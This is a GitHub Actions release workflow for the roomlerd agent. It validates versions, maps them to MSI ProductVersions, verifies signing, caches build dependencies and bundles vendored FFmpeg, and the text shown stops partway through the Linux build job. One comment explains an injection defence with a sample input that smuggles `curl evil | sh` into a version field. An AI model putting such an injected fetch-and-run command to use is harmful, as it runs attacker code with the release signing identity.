# RETIRED-NAME-ANCHOR-BEGIN
# Every retired name in this workflow is either a PUBLISHED release-asset name
# (already-released files cannot be renamed, and the updater's picker matches
# those strings) or a FROZEN install path — the RPATH-bound
# /usr/lib/roomler-agent, the macOS .app bundle whose name keys the TCC grants,
# or the inert roomler-agent.exe alias the deployed fleet still resolves.
# INVARIANT: a retired name here must be a published artifact name or a path a
# real host has. If you add one that is neither, that is a bug, not a new
# exemption. docs/fr/FR-21
name: Release roomlerd

# Builds per-OS installers for the roomlerd binary (MSI on Windows,
# notarised .pkg on macOS, .deb on Linux). Triggered either by pushing a
# tag matching `agent-v*` (publishes a GitHub Release) or manually via
# workflow_dispatch (uploads workflow artifacts for 30-day retention).
#
# Windows signing goes through ./.github/actions/sign-windows (Azure Artifact
# Signing over GitHub OIDC — no key material is stored in this repository).
# Signedness is a VERIFIED property of the bytes, never a filename suffix and
# never "a secret happened to be set": the action re-reads every signature
# with `signtool verify /pa /all` and, on a release run, FAILS the job rather
# than publishing unsigned. Dispatch runs without credentials still succeed
# with a ::warning:: so packaging can be iterated.
#
# The signing jobs carry `environment: release` — the Entra federated
# credential is bound to that GitHub environment (this tenant rejects
# wildcard tag-subject credentials), so removing the environment line breaks
# the OIDC exchange for azure-mode signing.
#
# Rehearse for free with `signing_mode: local` and the self-signed cert from
# scripts/signing/50-selfsigned-dev-cert.ps1. Setup + background:
# docs/code-signing.md.

on:
  push:
    tags:
      - 'agent-v*'
  schedule:
    # Weekly cache-seed rehearsal (Mon 03:17 UTC) — an artifacts-only run
    # on master whose Swatinem saves land on the MASTER ref, the only ref
    # tag builds can restore from (see the save-if comments below). Keeps
    # the seed alive across toolchain bumps (which rotate the cache env
    # hash and orphan every prior seed — exactly what left tag builds
    # fully cold from 2026-07-15 to rc.208) and the 7-day unused-cache
    # expiry. seed-release-caches.yml additionally dispatches the same
    # rehearsal immediately when rust-toolchain.toml or this file changes.
    - cron: '17 3 * * 1'
  workflow_dispatch:
    inputs:
      version:
        description: 'Agent version (e.g. 0.1.0) — must match workspace Cargo.toml'
        required: true
      publish_release:
        description: 'Create a GitHub Release with the artifacts'
        type: boolean
        default: false
      signing_mode:
        description: 'Windows signing: auto (azure if configured) | azure | local (self-signed rehearsal) | off'
        type: choice
        options: [auto, local, azure, 'off']
        default: auto
      require_signing:
        description: 'Fail the job if artifacts end up unsigned (rehearses the release-tag gate)'
        type: boolean
        default: false

permissions:
  contents: write
  # actions:write is for the `reseed` job's workflow_dispatch. (The #485
  # "delete BEFORE restore" seed steps are gone: cache keys now carry a
  # per-Cargo.lock suffix, so saves always land under a fresh key and
  # restores prefix-fall-back to the newest generation — no absent-key
  # window, no forced-cold rehearsals.)
  actions: write

# Runner-queue hygiene (2026-08-20, run 32363354465): rc.424's Windows MSI
# job sat QUEUED for 70 minutes — a release burst (3 tag runs in 20 min +
# installer-smoke ×3 + a Windows job on every CI run) plus a reseed
# rehearsal per release (2 more Windows jobs each) stacked past the
# account's concurrent-job cap. Rehearsals exist only for their final
# cache save and only the NEWEST one matters, so they share one
# cancel-in-progress group: a fresh reseed cancels its superseded
# predecessor instead of queueing behind it. Tag builds and explicit
# publishes get a unique group and are NEVER cancelled. (A cancelled
# rehearsal triggers no seed-failure alert — the alert keys on
# failure, not cancellation — and its lost save is exactly the
# generation the newer rehearsal supersedes.)
concurrency:
  group: >-
    ${{ (github.event_name == 'schedule' ||
         (github.event_name == 'workflow_dispatch' && github.event.inputs.publish_release != 'true'))
        && 'agent-seed-rehearsal'
        || format('agent-run-{0}', github.run_id) }}
  cancel-in-progress: >-
    ${{ github.event_name == 'schedule' ||
        (github.event_name == 'workflow_dispatch' && github.event.inputs.publish_release != 'true') }}

# P3e Phase 2: single-codegen-unit release artifacts. Set as WORKFLOW env
# (cargo reads CARGO_PROFILE_RELEASE_* like a Cargo.toml [profile.release]
# key) instead of the workspace manifest, deliberately: the manifest form
# would also slow the API docker image build on the build host, which ships
# in a container where binary size is irrelevant. Measured on the rc.363
# tree (32-core box, cold): roomlerd 31.95 -> 26.07 MiB (-18.4%) at 128 ->
# 200 s; the standalone CLI 21.29 -> 15.53 MiB (-27.1%). NB fat/thin LTO
# both LOSE to this on size AND build time for these binaries (thin is
# +5% SIZE over baseline) — do not "upgrade" this to lto without
# re-measuring. First run after this change rebuilds the caches (the env
# is part of cargo's fingerprint); that one-time cost is the same class as
# any dependency bump.
env:
  CARGO_PROFILE_RELEASE_CODEGEN_UNITS: "1"

jobs:
  # ---------------------------------------------------------------------------
  # 0. Validate that the requested version matches Cargo.toml.
  # ---------------------------------------------------------------------------
  validate-version:
    name: Validate version
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.resolve.outputs.version }}
      msi_version: ${{ steps.resolve.outputs.msi_version }}
      tag: ${{ steps.resolve.outputs.tag }}
      is_release: ${{ steps.resolve.outputs.is_release }}
    steps:
      - uses: actions/checkout@v4

      - name: Resolve version + tag
        id: resolve
        shell: bash
        # `workflow_dispatch` inputs reach the script through the environment,
        # never through `${{ }}` interpolation into the shell. Interpolation
        # pastes the raw value into the script text, so an input like
        # `x"; curl evil | sh; "` would EXECUTE here — and this job carries
        # `id-token: write` + the `release` environment, i.e. the signing
        # identity. Dispatch needs repo write, so this is an insider/stolen-
        # token vector rather than an anonymous one, but the fix is free.
        env:
          INPUT_VERSION: ${{ github.event.inputs.version }}
          INPUT_PUBLISH_RELEASE: ${{ github.event.inputs.publish_release }}
        run: |
          set -euo pipefail
          # Grep the [workspace.package] table for the declared version.
          cargo_version=$(awk '
            /^\[workspace\.package\]/ {in_section=1; next}
            /^\[/ {in_section=0}
            in_section && /^version[[:space:]]*=/ {
              gsub(/"/, "", $3)
              print $3
              exit
            }
          ' Cargo.toml)
          echo "Cargo.toml workspace version: ${cargo_version}"

          if [[ "$GITHUB_EVENT_NAME" == "schedule" ]]; then
            # Weekly cache-seed rehearsal: no tag, no inputs. Build whatever
            # master currently is, artifacts-only — the run exists for its
            # master-ref Swatinem saves, which every tag build restores.
            version="${cargo_version}"
            tag="agent-v${version}"
            is_release=false
          elif [[ "$GITHUB_EVENT_NAME" == "push" ]]; then
            tag="${GITHUB_REF_NAME}"
            version="${tag#agent-v}"
            is_release=true
          else
            version="${INPUT_VERSION:-}"
            # Shape-check before the value is used anywhere else. A dispatch
            # input is attacker-influenced in the insider case above, and the
            # mismatch check further down compares it to Cargo.toml — which
            # is a correctness gate, not a syntax one.
            if [[ ! "$version" =~ ^[0-9]+\.[0-9]+\.[0-9]+(-rc\.[0-9]+)?$ ]]; then
              echo "::error::Invalid version input: '${version}' (expected N.N.N or N.N.N-rc.N)"
              exit 1
            fi
            tag="agent-v${version}"
            if [[ "${INPUT_PUBLISH_RELEASE:-}" == "true" ]]; then
              is_release=true
            else
              is_release=false
            fi
          fi

          echo "Resolved: version=${version} tag=${tag} is_release=${is_release}"

          if [[ "${cargo_version}" != "${version}" ]]; then
            echo "::error::Version mismatch: requested ${version} but Cargo.toml has ${cargo_version}"
            exit 1
          fi

          # Derive the MSI ProductVersion. Windows Installer IGNORES the
          # 4th (revision) version field for upgrade comparison, so the
          # raw semver `0.3.0-rc.N` — which cargo-wix maps to `0.3.0.N` —
          # made every rc look like the same `0.3.0` product: WiX
          # MajorUpgrade never saw a "newer" version, never removed the
          # prior one, and rc builds piled up (8 perMachine versions
          # found coexisting on a host 2026-06-01). Fix: put the rc in
          # the 3rd (build) field so MSI ProductVersions are monotonic —
          # `MAJOR.MINOR.RC`. A final (non-rc) release maps the build
          # field to 65535 so it outranks every rc of that minor. Only
          # the MSI-internal ProductVersion changes; the .msi *filename*
          # keeps the readable semver (see the rename steps below).
          # Assumes the project's `MAJOR.MINOR.0-rc.N` scheme (patch == 0
          # for rc builds) — fails loudly otherwise so the mapping can't
          # silently collide.
          #
          # ⚠️ THIS MAPPING HAS FIVE MORE COPIES:
          # agents/roomlerd/src/artifact_version.rs::msi_product_version_for
          # (download verification),
          # agents/roomlerd/src/version_sweep.rs::own_msi_version
          # (coexisting-MSI sweep — a divergence there makes an agent rank
          # its OWN install as older and uninstall itself), and the three
          # build.rs VERSIONINFO embeds (roomlerd, roomler-cli-shim,
          # roomler-cli — `file_version`): those stamp the EXE
          # FILEVERSION shown by Explorer/EDR inventory; a divergence there
          # is cosmetic-but-confusing (EXE claims a different version than
          # the MSI), nothing asserts it at build time.
          # The self-updater reads the ProductVersion back out of the
          # downloaded MSI and refuses to install one that does not carry
          # the version the release manifest claimed — that is what stops a
          # tampered manifest from pointing a high version number at a
          # genuinely-signed OLDER build. The two copies MUST change
          # together: if they diverge, every agent refuses every update and
          # the symptom is a silent fleet-wide update freeze, not an error.
          # `cargo test -p roomlerd --lib -- --ignored real_published_msi`
          # re-checks the Rust side against a real published MSI.
          if [[ "$version" =~ ^([0-9]+)\.([0-9]+)\.([0-9]+)-rc\.([0-9]+)$ ]]; then
            vmajor="${BASH_REMATCH[1]}"; vminor="${BASH_REMATCH[2]}"
            vpatch="${BASH_REMATCH[3]}"; vrc="${BASH_REMATCH[4]}"
            if [[ "$vpatch" != "0" ]]; then
              echo "::error::rc builds must have patch == 0 (got ${version}); the MAJOR.MINOR.RC MSI mapping would collide with a patched rc"
              exit 1
            fi
            if (( vrc > 65535 )); then
              echo "::error::rc number ${vrc} exceeds the MSI build-field max (65535)"
              exit 1
            fi
            msi_version="${vmajor}.${vminor}.${vrc}"
          elif [[ "$version" =~ ^([0-9]+)\.([0-9]+)\.([0-9]+)$ ]]; then
            # Finals — two eras, split at 0.4 (the rc train ended with
            # 0.3.0-rc.*):
            #  * 0.4+ ships plain MAJOR.MINOR.PATCH releases, so PATCH is
            #    the build field (0.4.5 → 0.4.5): monotonic within the
            #    minor, no two 0.4.x MSIs share a ProductVersion.
            #  * pre-0.4 keeps the legacy 65535 rule so historical answers
            #    never change.
            # Mirrored in msi_product_version_for AND version_sweep's
            # own_msi_version — all three MUST agree (see the warning above).
            fmajor="${BASH_REMATCH[1]}"; fminor="${BASH_REMATCH[2]}"; fpatch="${BASH_REMATCH[3]}"
            if (( fmajor > 0 || fminor >= 4 )); then
              if (( fpatch > 65535 )); then
                echo "::error::patch ${fpatch} exceeds the MSI build-field max (65535)"
                exit 1
              fi
              msi_version="${fmajor}.${fminor}.${fpatch}"
            else
              msi_version="${fmajor}.${fminor}.65535"
            fi
          else
            echo "::error::cannot derive an MSI version from '${version}' (expected MAJOR.MINOR.PATCH or MAJOR.MINOR.PATCH-rc.N)"
            exit 1
          fi
          echo "Resolved MSI ProductVersion: ${msi_version} (from ${version})"

          echo "version=${version}" >> "$GITHUB_OUTPUT"
          echo "msi_version=${msi_version}" >> "$GITHUB_OUTPUT"
          echo "tag=${tag}"         >> "$GITHUB_OUTPUT"
          echo "is_release=${is_release}" >> "$GITHUB_OUTPUT"

  # ---------------------------------------------------------------------------
  # 1. Linux — .deb via cargo-deb, bundles the systemd-user unit.
  # ---------------------------------------------------------------------------
  build-linux:
    name: Build .deb (Linux x86_64)
    needs: validate-version
    # Build on 22.04 (glibc 2.35), NOT ubuntu-latest (now 24.04 = glibc 2.39):
    # a 24.04-built binary requires GLIBC_2.39 and fails the "loads on stock
    # Ubuntu 22.04" guard (and won't run on any pre-24.04 host). Building on
    # 22.04 produces a binary + bundled host-libs that load on 22.04 AND 24.04.
    runs-on: ubuntu-22.04
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@v4

      # FR-6 wave 19 (#773): every package this job installs, from the Actions
      # cache instead of the Ubuntu mirror. These were three raw `apt-get`
      # steps (this one, the companion's desktop deps, patchelf), and on
      # 2026-10-01 from 17:38Z the Azure mirror stalled them for 18 min of a
      # 35.5 min job (594 s + 512 s, against ~22 s each); the same mirror had
      # stalled ci.yml's profiles job the day before. A tag build restores the
      # set the master rehearsal saved (a run may restore the default branch's
      # caches), so for packages it makes no mirror contact; only the index
      # refresh below still does.
      #
      # ⚠️ The key carries `u2204` because cache-apt-pkgs-action keys on the
      # package list + `version` + CPU arch only, never the OS release.
      # ci.yml's lanes cache a near-identical list on ubuntu-latest (24.04);
      # sharing their key here would unpack 24.04 libraries onto this 22.04
      # builder, and from there into the .deb it ships.
      - name: Configure apt retries and refresh the index
        # Before the cached step: on a stale index the action resolves versions
        # the mirror has dropped, installs NOTHING and still reports success
        # (ci.yml's composite records both incidents).
        run: |
          echo 'Acquire::Retries "3";' | sudo tee /etc/apt/apt.conf.d/80-ci-retries
          sudo apt-get update -qq

      - name: Install system build deps (cached apt)
        # libvpx-dev for the `vp9-444` feature (bindgen + link). Ubuntu ships
        # its own libvpx; libvpx 1.16.x changes the header-include order in a
        # way that triggers a known bindgen forward-declaration bug, so do not
        # bump beyond apt's version here. xcb + alsa for capture and audio; the
        # GTK/WebKit + ayatana set for the desktop companion, which builds in
        # build-linux-companion from this same cached set (FR-6 wave 20);
        # patchelf for the FFmpeg bundling step. Bump `version:` whenever this
        # list changes, in BOTH jobs: they must stay byte-identical to share one
        # cache entry.
        uses: awalsh128/cache-apt-pkgs-action@v1
        with:
          packages: libxcb1-dev libxcb-shm0-dev libxcb-randr0-dev cmake libclang-dev pkg-config libvpx-dev libasound2-dev libglib2.0-dev libgtk-3-dev libsoup-3.0-dev libjavascriptcoregtk-4.1-dev libwebkit2gtk-4.1-dev libayatana-appindicator3-dev patchelf
          version: release-linux-u2204-v1

      - name: Verify the build deps really landed (fallback to apt-get)
        # Asks what the build consults (pkg-config, the loader, the tools),
        # never the action's status, and never dpkg: a restore untars files and
        # registers nothing. `sudo ldconfig` first, because the restore runs no
        # postinst and /etc/ld.so.cache would otherwise miss libvpx on every hit.
        run: |
          set -euo pipefail
          pkgs="libxcb1-dev libxcb-shm0-dev libxcb-randr0-dev cmake libclang-dev pkg-config libvpx-dev libasound2-dev libglib2.0-dev libgtk-3-dev libsoup-3.0-dev libjavascriptcoregtk-4.1-dev libwebkit2gtk-4.1-dev libayatana-appindicator3-dev patchelf"
          check() {
            sudo ldconfig
            for m in vpx xcb xcb-shm xcb-randr alsa glib-2.0 gtk+-3.0 libsoup-3.0 javascriptcoregtk-4.1 webkit2gtk-4.1 ayatana-appindicator3-0.1; do
              pkg-config --exists "$m" || { echo "missing: pkg-config module $m"; return 1; }
            done
            for t in cmake patchelf; do
              command -v "$t" >/dev/null || { echo "missing: $t"; return 1; }
            done
            # Not `grep -q`: it exits at the first match, ldconfig takes SIGPIPE,
            # and under pipefail a present library would read as missing.
            ldconfig -p | grep 'libvpx\.so' >/dev/null || { echo "missing: libvpx.so in the loader cache"; return 1; }
            compgen -G '/usr/lib/llvm-*/lib/libclang*.so*' >/dev/null || { echo "missing: libclang"; return 1; }
          }
          if ! check; then
            echo "::warning::the cached apt set did not deliver the release build deps; installing directly"
            sudo apt-get update -qq
            # shellcheck disable=SC2086
            sudo apt-get install -y $pkgs
          fi
          check || { echo "::error::release build deps still missing after the fallback install"; exit 1; }

      - name: Install Rust toolchain
        uses: dtolnay/rust-toolchain@1.95.0

      - name: Restore cargo seed (lockfile-generation keys)
        # Explicit actions/cache with OUR key scheme -- rust-cache cannot
        # express "unique key + prefix restore + no env hash": with
        # add-rust-environment-hash-key:false its `key:` input is folded
        # into the dropped component (a no-op -- #482, re-proven by probe
        # run 31907241610). Unique key per Cargo.lock => saves always
        # land; prefix restore => never an absent-key window (the rc.382
        # race); no env hash => no runner-image warm/cold lottery. Full
        # story in .github/actions/seed-cache-restore. The paired save
        # step is at the end of this job.
        continue-on-error: true
        uses: ./.github/actions/seed-cache-restore
        # GH_TOKEN: the asset-based restore downloads from the seed-cache
        # release (probe run 32903453670 built cold on every lane for want
        # of it — the old actions/cache restore needed no token).
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          shared-key: agent-linux

      - name: Install cargo-deb
        # Idempotent: the lockfile-generation seed caches (#488) restore
        # ~/.cargo/bin WITH the tool already present, and a plain
        # `cargo install` hard-errors on an existing binary (rc.383's
        # release run died on exactly this in all three build jobs).
        run: command -v cargo-deb >/dev/null || cargo install cargo-deb --locked

      - name: Fetch vendored FFmpeg 9.0.1 (for the ffmpeg-encoder HEVC backend)
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          # Prebuilt LGPL FFmpeg 9.0.1 (nvenc/qsv/amf/vaapi/vulkan HEVC + the
          # LGPL libkvazaar SW encoder; NO GPL libx265 → the MIT agent stays
          # license-clean, matching the Windows vcpkg policy). Published once
          # at the `vendored-ffmpeg-9.0.1` release and reused by every build
          # instead of compiling FFmpeg from source: Ubuntu apt ships only
          # FFmpeg 6.1, but `ffmpeg-next = 9.0` needs 9.x.
          gh release download vendored-ffmpeg-9.0.1 \
            --repo "${{ github.repository }}" \
            --pattern 'ffmpeg-9.0.1-linux64-lgpl-shared-minimal-vaapi-vulkan-h264dec-aac.tar.xz' \
            --dir /tmp/ffdl
          # P3e lever B (Linux twin): the MINIMAL from-source build — the ten
          # HW encoders + their parsers, nothing else (whole lib dir 2.5 MB
          # vs ~50 MB of libav* in the old BtbN re-upload; the agent's
          # cascade is locked to nvenc/qsv/amf by a unit test, so kvazaar/
          # vaapi/every-decoder were unreachable). Vendor job's runtime probe
          # asserts the encoder set; rollback = drop the `-minimal` suffix.
          # FR-77 P4 added `-vaapi`: `--enable-vaapi` + the four `*_vaapi`
          # encoders, with libva/libva-drm/libdrm BUILT INTO the tree (the
          # bundler below carries them; no `Depends` on the system's libva,
          # which the offline `dpkg --install` fallback could not satisfy
          # without leaving a daemon that fails to load). Rollback = drop
          # that suffix. FR-78 P0 added `-vulkan` (three Vulkan encoders,
          # dlopen'd — no new DT_NEEDED); rollback = drop that one. FR-85 P4c
          # added `-h264dec-aac` (the software h264 decoder the recorder's
          # editor needs and the aac encoder for its sound, inside libavcodec,
          # no new DT_NEEDED); rollback = drop that one.
          sudo mkdir -p /opt/roomler-ffmpeg
          sudo tar xf /tmp/ffdl/ffmpeg-9.0.1-linux64-lgpl-shared-minimal-vaapi-vulkan-h264dec-aac.tar.xz \
            -C /opt/roomler-ffmpeg --strip-components=1
          # BtbN's pkgconfig files hardcode the build-machine prefix; rewrite
          # it to our extract path so pkg-config emits correct -L/-I flags.
          sudo sed -i "s|^prefix=.*|prefix=/opt/roomler-ffmpeg|" \
            /opt/roomler-ffmpeg/lib/pkgconfig/*.pc
          {
            echo "FFMPEG_DIR=/opt/roomler-ffmpeg"
            echo "PKG_CONFIG_PATH=/opt/roomler-ffmpeg/lib/pkgconfig"
            echo "LD_LIBRARY_PATH=/opt/roomler-ffmpeg/lib"
          } >> "$GITHUB_ENV"
          # ── FR-62 A2 drift gate: the vendored libs must have been built from
          #    the FFmpeg source patches committed in this checkout. The vendor
          #    build wrote ROOMLER-PATCHES.txt (sha256 per patch) into the
          #    tarball; assert it equals the committed set. A mismatch or an
          #    absent manifest while patches exist means the vendored asset is
          #    STALE — re-run vendor-ffmpeg-windows.yml (Linux + Windows jobs)
          #    before tagging. Fail closed: never ship an agent whose FFmpeg
          #    lacks the source patches the code assumes.
          shopt -s nullglob
          committed=( "$GITHUB_WORKSPACE"/.github/ffmpeg-patches/*.patch )
          if [ ${#committed[@]} -gt 0 ]; then
            # Normalise both sides to `<sha256-lowercase> <basename>` (one
            # space), sorted — robust to the manifest's two-space sha256sum
            # format and to the absolute paths in `committed`. (A greedy
            # `sed 's#.*/##'` on the sha256sum output would strip the HASH too,
            # since `.` matches the spaces before the path — the bug this
            # replaces.)
            want=$(for f in "${committed[@]}"; do printf '%s %s\n' "$(sha256sum "$f" | cut -d' ' -f1)" "$(basename "$f")"; done | sort)
            got_file=/opt/roomler-ffmpeg/ROOMLER-PATCHES.txt
            if [ ! -f "$got_file" ]; then
              echo "::error::vendored FFmpeg carries no ROOMLER-PATCHES.txt but ${#committed[@]} patch(es) are committed — re-vendor before tagging (see .github/ffmpeg-patches/)"; exit 1
            fi
            got=$(awk 'NF{print tolower($1), $NF}' "$got_file" | sort)
            if [ "$want" != "$got" ]; then
              echo "::error::vendored FFmpeg patch manifest != committed .github/ffmpeg-patches/ — re-run vendor-ffmpeg-windows.yml"
              echo "--- committed ---"; echo "$want"; echo "--- in asset ---"; echo "$got"; exit 1
            fi
            echo "FR-62 A2 gate OK: vendored FFmpeg built from ${#committed[@]} committed patch(es)"
          fi

      - name: FR-24 gate — the LGPL source offer covers what this release ships
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          # ── THIRD-PARTY-NOTICES.md's written offer points at the
          #    corresponding-source bundle on vendored-ffmpeg-9.0.1. That bundle
          #    must carry every change our builds make to FFmpeg: the committed
          #    .github/ffmpeg-patches/ AND the vcpkg port at the recipe's
          #    $baseline. lgpl-source-offer.yml publishes what it was built from
          #    as `…corresponding-source.inputs.txt` (`<hash> <name>` per patch,
          #    `<sha> vcpkg-baseline`, and the sha256 of each recipe file it
          #    ships); compare it with this checkout. The recipe counts since
          #    FR-85 P4c: the configure options live there, not in a patch, so
          #    a build whose options changed passed this gate against an offer
          #    that described the old ones.
          #    ⚠️ From #1249 (2026-09-02) to 2026-09-24 every release shipped a
          #    patched FFmpeg while the offered source omitted the patch and
          #    said "we apply no patches", and nothing checked. Fail closed:
          #    an offer claiming completeness it lacks is a compliance claim we
          #    cannot make. Bump the two `9.0.1` names below with the download
          #    step above when FFmpeg moves.
          shopt -s nullglob
          committed=( "$GITHUB_WORKSPACE"/.github/ffmpeg-patches/*.patch )
          baseline=$(sed -n "s/^[[:space:]]*\$baseline = '\([0-9a-f]\{40\}\)'.*/\1/p" \
            "$GITHUB_WORKSPACE/.github/workflows/vendor-ffmpeg-windows.yml" | head -1)
          if [ -z "$baseline" ]; then
            echo "::error::no \$baseline in vendor-ffmpeg-windows.yml — re-derive this gate's parse"; exit 1
          fi
          want=$( { for f in "${committed[@]}"; do printf '%s %s\n' "$(sha256sum "$f" | cut -d' ' -f1)" "$(basename "$f")"; done
                    printf '%s %s\n' "$baseline" vcpkg-baseline
                    for r in vendor-ffmpeg-windows.yml vendor-ffmpeg-macos.yml; do
                      printf '%s %s\n' "$(sha256sum "$GITHUB_WORKSPACE/.github/workflows/$r" | cut -d' ' -f1)" "recipe/$r"
                    done; } | sort )
          mkdir -p /tmp/offer
          if ! gh release download vendored-ffmpeg-9.0.1 --repo "${{ github.repository }}" \
               --pattern 'ffmpeg-n9.0.1-corresponding-source.inputs.txt' --dir /tmp/offer --clobber; then
            echo "::error::the LGPL offer on vendored-ffmpeg-9.0.1 publishes no inputs.txt — dispatch lgpl-source-offer.yml before tagging"; exit 1
          fi
          got=$(awk 'NF{print tolower($1), $NF}' /tmp/offer/ffmpeg-n9.0.1-corresponding-source.inputs.txt | sort)
          if [ "$want" != "$got" ]; then
            echo "::error::the published LGPL corresponding source was not built from this checkout's FFmpeg patches, vcpkg baseline and build recipe — dispatch lgpl-source-offer.yml before tagging"
            echo "--- this checkout ---"; echo "$want"; echo "--- in the offer ---"; echo "$got"; exit 1
          fi
          echo "FR-24 gate OK: the LGPL offer carries ${#committed[@]} patch(es) + vcpkg baseline ${baseline:0:8} + this checkout's recipe"

      - name: Build agent (release, full + vp9-444 + vp9-444-bindgen)
        # `vp9-444` adds the libvpx VP9 profile-1 (8-bit 4:4:4) software
        # encoder for the DataChannel-bypass video transport (Phase Y in
        # docs/encoders.md). Browser viewers that flip the
        # "Crystal-clear (VP9 4:4:4)" toolbar toggle expect this on the
        # other end.
        # `vp9-444-bindgen` enables `env-libvpx-sys/generate` so bindgen
        # runs against the system libvpx 1.14 headers; without this the
        # build script panics looking for `vpx-ffi-1.14.0.rs` in the
        # crate's `generated/` dir (only ships ≤ 1.13.0).
        # `overlay-l3` (Phase 3b) compiles in the Tailscale-style overlay mesh
        # (WireGuard via boringtun + the OS TUN device). `overlay-netstack` adds
        # the userspace-smoltcp OS-free surface (field-validated 2026-07-11
        # against the live overlay incl. a Check Point host). Both pure-Rust, no
        # extra system dep on Linux (/dev/net/tun is in-kernel; smoltcp needs
        # nothing). Default-OFF: an agent only joins the mesh when its config
        # sets `overlay_enabled`, and netstack mode additionally needs
        # `ROOMLERD_OVERLAY_NETSTACK_SOCKS=<port>` — so shipping both
        # everywhere is inert until an operator opts a host in.
        # `ffmpeg-encoder` adds the FFmpeg HEVC backend (hevc_nvenc / qsv / amf
        # / vaapi / vulkan) via the vendored FFmpeg 9.0.1 fetched above — the
        # Linux/WSL counterpart to the Windows MF/vcpkg HEVC path.
        # `full` now includes `audio` (system-audio Opus track) → pulls cpal
        # (ALSA, libasound2-dev above) + audiopus (bundled libopus via CMake).
        env:
          # audiopus_sys' bundled libopus CMakeLists declares
          # cmake_minimum_required(VERSION < 3.5); CMake 3.31+ errors without
          # this policy shim.
          CMAKE_POLICY_VERSION_MINIMUM: "3.5"
        run: cargo build -p roomlerd --release --features "full,hive,vp9-444,vp9-444-bindgen,overlay-l3,overlay-netstack,ffmpeg-encoder,ssh-server,viewer-indicator-x11"

      # P3e Phase 2: the .deb's `roomler` is now the CLI SHIM (re-execs
      # `roomlerd cli`) — the Linux twin of the rc.365 MSI change. It must
      # exist before `cargo deb --no-build` runs (the assets list references
      # target/release/roomler-shim). Replaces the 143 s full-CLI build that
      # duplicated ~21 MiB of the daemon's crates inside the .deb, and
      # structurally retires the CLI/daemon version-skew failure class
      # (field-caught 2026-08-06: rc.205 CLI vs rc.311 daemon) — the command
      # surface now lives inside roomlerd itself. Tunnel-ONLY Linux hosts
      # still get the real standalone binary from release-tunnel.yml.
      - name: Build the roomler CLI shim (shipped in the .deb alongside roomlerd)
        run: |
          cargo build -p roomler-cli-shim --release
          test -f target/release/roomler-shim || { echo "::error::roomler-shim not produced — the cargo-deb assets entry would fail"; exit 1; }

      - name: Bundle FFmpeg into the .deb (self-contained, RPATH)
        run: |
          set -euo pipefail
          # Ubuntu 24.04 ships FFmpeg 6.1 (libavcodec.so.60) but the agent links
          # 9.0.1 (libavcodec.so.63), so the .deb must CARRY its own FFmpeg or it
          # won't start on a stock box. Ship each lib under its SONAME as a real
          # file (no symlinks) into /usr/lib/roomler-agent; RPATH wires it up.
          # patchelf comes from the cached apt set at the top of this job.
          dst=agents/roomlerd/vendor-ffmpeg
          rm -rf "$dst" && mkdir -p "$dst"
          # P3e Phase 3: bundle ONLY the vendored libs the binary actually
          # references. Before the ffmpeg codec+format trim the binary linked
          # all seven libav* and the blanket copy was accurate; post-trim it
          # links avcodec/avformat/avutil/swresample only, and blindly copying
          # the rest (avfilter alone is ~18 MB of .so) kept the .deb at
          # ~56 MiB for dead weight. `ldd` lists the TRANSITIVE closure, so
          # deriving the keep-set from it stays correct if linkage changes
          # again — a lib that stops being referenced silently drops out, and
          # one that starts being referenced is caught by the empty-copy guard
          # + the stock-24.04 load check below.
          # Pass 1: the binary's own DT_NEEDED (ldd prints the SONAME in $1
          # even for not-yet-findable libs). Passes 2..n: each copied lib's
          # OWN needs — ldd cannot traverse INTO a lib it can't find, so
          # vendored-lib -> vendored-lib edges (e.g. avformat -> swresample)
          # need the fixpoint. Converges in 2 passes today; capped at 5.
          needed=$(ldd target/release/roomlerd | awk '{print $1}')
          for _pass in 1 2 3 4 5; do
            grew=0
            for real in $(find /opt/roomler-ffmpeg/lib -maxdepth 1 -type f -name 'lib*.so.*'); do
              soname=$(patchelf --print-soname "$real")
              [ -f "$dst/$soname" ] && continue
              if echo "$needed" | grep -qx "$soname"; then
                cp "$real" "$dst/$soname"
                grew=1
              fi
            done
            [ "$grew" = "1" ] || break
            needed=$(printf '%s\n' "$needed"; for l in "$dst"/lib*.so.*; do patchelf --print-needed "$l"; done)
          done
          copied=$(ls "$dst" | wc -l)
          for real in $(find /opt/roomler-ffmpeg/lib -maxdepth 1 -type f -name 'lib*.so.*'); do
            soname=$(patchelf --print-soname "$real")
            [ -f "$dst/$soname" ] || echo "skipping unreferenced vendored lib: $soname"
          done
          # Floor = avcodec + avutil. With the MINIMAL vendored build the
          # linker's --as-needed drops even avformat AND swresample from
          # DT_NEEDED (the trimmed avcodec's pulled code never calls them;
          # .pc Requires is a link-time statement, not a runtime one) — the
          # first minimal rehearsal proved copied=2 is the correct steady
          # state, and the earlier ">= 3" guard encoded the FULL build's
          # linkage as law. Correctness is owned by the stock-24.04 load
          # check below; this guard only catches a broken derivation (0-1
          # matches = ldd/soname parsing went wrong).
          [ "$copied" -ge 2 ] || { echo "::error::only $copied vendored FFmpeg libs matched — expected at least avcodec+avutil; the keep-set derivation is broken"; exit 1; }
          # The agent binary ITSELF dynamically links libvpx.so.7 (the `vp9-444`
          # VP9 software encoder — env-libvpx-sys links this build runner's
          # libvpx-dev, which is 1.12 / libvpx.so.7 on ubuntu-22.04). Stock
          # Ubuntu 24.04 ships only libvpx.so.9, so WITHOUT bundling this the
          # .deb installs cleanly but the agent aborts at load with
          # `libvpx.so.7: cannot open shared object file`. Carry it alongside the
          # FFmpeg libs so the .deb runs on 22.04 (native) AND 24.04 (bundled).
          vpx7=$(readlink -f /usr/lib/x86_64-linux-gnu/libvpx.so.7)
          cp "$vpx7" "$dst/libvpx.so.7"
          [ -f "$dst/libvpx.so.7" ] || { echo "::error::libvpx.so.7 not bundled — agent aborts at load on 24.04"; exit 1; }
          # Each FFmpeg lib finds its siblings in the same dir ($ORIGIN); the
          # binary finds them at the absolute install dir. Only glibc-family
          # deps remain external (audited) — the HW encoders (nvenc/qsv/amf/
          # vaapi/vulkan) dlopen their driver libs at runtime, so no extra
          # .deb `depends` are needed.
          for lib in "$dst"/*.so.*; do patchelf --set-rpath '$ORIGIN' "$lib"; done
          # P3d Slice B: the daemon binary is now `roomlerd` (the [[bin]] output
          # name); the .deb assets map installs it to /usr/lib/roomler-agent RPATH.
          patchelf --set-rpath '/usr/lib/roomler-agent' target/release/roomlerd
